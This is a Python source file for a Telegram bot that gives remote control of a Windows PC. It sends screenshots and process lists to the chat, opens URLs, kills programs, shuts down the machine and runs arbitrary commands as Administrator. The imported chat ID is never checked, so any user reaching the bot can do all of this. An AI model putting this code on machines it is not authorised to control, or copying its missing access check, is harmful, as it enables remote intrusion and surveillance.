from config.apiKey import ACCESS_TOKEN, ID_CHAT
from tkinter import messagebox
from telebot import TeleBot, types
from io import BytesIO
from PIL import Image
import subprocess
import webbrowser
import pyautogui
import requests
import psutil
import os
import socket

bot = TeleBot(ACCESS_TOKEN, parse_mode=None)

waiting_for_url = {}
waiting_for_text = {}
waiting_for_program_name = {}
waiting_for_command = {}

@bot.message_handler(commands=['help', 'start'])
def send_message(message):
    computer_name = socket.gethostname()
    text = f"{computer_name} is ON ⚡"
    markup = types.InlineKeyboardMarkup()
    screenshot = markup.add(types.InlineKeyboardButton("Screenshot 📷", callback_data="screenshot"))
    tasklist = markup.add(types.InlineKeyboardButton("Tasklist 📋", callback_data="tasklist"))
    show_inbox = markup.add(types.InlineKeyboardButton("Show Text 📥", callback_data="showinbox"))
    open_url = markup.add(types.InlineKeyboardButton("Open URL 🔗", callback_data="url"))
    end_app = markup.add(types.InlineKeyboardButton("End Application 🛑", callback_data="killapp"))
    shutdown = markup.add(types.InlineKeyboardButton("Shutdown 🚫", callback_data="shutdown"))
    restart = markup.add(types.InlineKeyboardButton("Restart 🔄", callback_data="restart"))
    run_command = markup.add(types.InlineKeyboardButton("Run Command ⚙️", callback_data="runcmd"))
    bot.send_message(message.chat.id, text=text, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "screenshot":
        screenshot = pyautogui.screenshot()
        image_stream = BytesIO()
        screenshot.save(image_stream, format='PNG')
        image_stream.seek(0)
        bot.send_photo(call.message.chat.id, image_stream, caption="Here's a Screenshot!")
    elif call.data == "tasklist":
        running_apps = {proc.info['name'] for proc in psutil.process_iter(['pid', 'name'])}
        if running_apps:
            bot.send_message(call.message.chat.id, '\n'.join(running_apps))
        else:
            bot.send_message(call.message.chat.id, "No running applications.")
    elif call.data == "showinbox":
        bot.reply_to(call.message, "Enter the message:")
        waiting_for_text[call.message.chat.id] = "Inbox"
    elif call.data == "url":
        bot.reply_to(call.message, "Enter the URL:")
        waiting_for_url[call.message.chat.id] = True
    elif call.data == "killapp":
        bot.reply_to(call.message, "Enter the program name to terminate:")
        waiting_for_program_name[call.message.chat.id] = "KillApp"
    elif call.data == "shutdown":
        os.system("shutdown /s")
        bot.send_message(call.message.chat.id, "Shutdown successful!")
    elif call.data == "restart":
        os.system("shutdown /r")
        bot.send_message(call.message.chat.id, "Restart successful!")
    elif call.data == "runcmd":
        bot.reply_to(call.message, "Enter the command to run in the terminal:")
        waiting_for_command[call.message.chat.id] = True

@bot.message_handler(func=lambda message: waiting_for_url.get(message.chat.id, False))
def open_url(message):
    try:
        url = message.text
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"Opened URL: {url}")
        waiting_for_url[message.chat.id] = False
    except Exception as e:
        bot.send_message(message.chat.id, "An error occurred while opening the URL.")

@bot.message_handler(func=lambda message: waiting_for_text.get(message.chat.id) == "Inbox")
def show_inbox(message):
    messagebox.showinfo("Message", message.text)
    waiting_for_text[message.chat.id] = None

@bot.message_handler(func=lambda message: waiting_for_program_name.get(message.chat.id) == "KillApp")
def end_application(message):
    try:
        program_name = message.text
        for proc in psutil.process_iter(['pid', 'name']):
            if program_name.lower() in proc.info['name'].lower():
                psutil.Process(proc.info['pid']).terminate()
                bot.send_message(message.chat.id, f"Terminated application: {proc.info['name']}")
                break
        else:
            bot.send_message(message.chat.id, f"No application found with the name: {program_name}")
        waiting_for_program_name[message.chat.id] = None
    except Exception as e:
        bot.send_message(message.chat.id, "An error occurred while terminating the application.")

@bot.message_handler(func=lambda message: waiting_for_command.get(message.chat.id, False))
def run_command(message):
    try:
        command = message.text
        # Run command with administrative privileges using runas
        result = subprocess.run(['runas', '/user:Administrator', command], capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        bot.send_message(message.chat.id, f"Command Output:\n{output}")
        waiting_for_command[message.chat.id] = False
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred while running the command: {str(e)}")

if __name__ == "__main__":
    bot.infinity_polling()